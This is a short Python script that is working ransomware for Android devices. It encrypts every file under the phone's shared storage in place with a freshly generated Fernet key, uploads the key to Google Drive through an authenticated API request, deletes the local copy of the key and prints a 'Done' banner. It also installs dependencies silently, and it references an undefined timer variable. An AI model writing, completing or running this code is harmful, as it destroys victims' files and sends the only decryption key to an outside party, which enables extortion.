import os,time,json
try:
    from cryptography.fernet import Fernet
    import requests
    from tqdm import tqdm
except ImportError:
    os.system('pip3 install cryptography')
    os.system('pip3 install requests')
    os.system('pip3 install tqdm')
    from cryptography.fernet import Fernet
    import requests
    from tqdm import tqdm

password = ("passe")
key = Fernet.generate_key()

cipher = Fernet(key)

total_files = sum(len(files) for _, _, files in os.walk("/storage/emulated/0/"))

encrypted_files = 0

elapsed_time = 0
for root, dirs, files in os.walk("/storage/emulated/0/"):
    for filename in files:
        filepath = os.path.join(root, filename)
        with open(filepath, "rb") as f:
            original = f.read()
        encrypted = cipher.encrypt(original)
        with open(filepath, "wb") as f:
            f.write(encrypted)
        encrypted_files += 1
        if encrypted_files % 100 == 0:
            print(f"{encrypted_files} files encrypted so far.")
        if encrypted_files % 1000 == 0:
            elapsed_time = time.time() - start_time
            if elapsed_time > 60:
                print("Encryption is taking too long. Stopping.")
                break
    if encrypted_files % 1000 == 0:
        if elapsed_time > 60:
            break
with open("Password.txt", "wb") as f:
    f.write(key)
nun = ('abcde')
headers = {"Authorization": "Bearer " + nun}
para = {
    "name": "Password.txt"
}
files = {
    'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
    'file': open("Password.txt", "rb")
}
r = requests.post(
    "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
    headers=headers,
    files=files
)
if r.status_code == 200:
    os.remove("Password.txt")

password = ""


GREN = ('\033[92m')
pink = ('\033[95m')
RED = ("\033[31m")
yellow= ('\033[93m')
print(GREN+''' ____''')
print(GREN+'''|  _ \ '''+RED+''' ___ '''+yellow+''' _ __   '''+pink+'''___''')
print(GREN+'''| | | |'''+RED+'''/ _ \\\033[93m| '_ \\\033[95m / _ \\''')
print(GREN+'''| |_| |'''+RED+''' (_)'''+yellow+''' | | | |  '''+pink+'''__/''')
print(GREN+'''|____/'''+RED+''' \___/'''+yellow+'''|_| |_|'''+pink+'''\___|''')
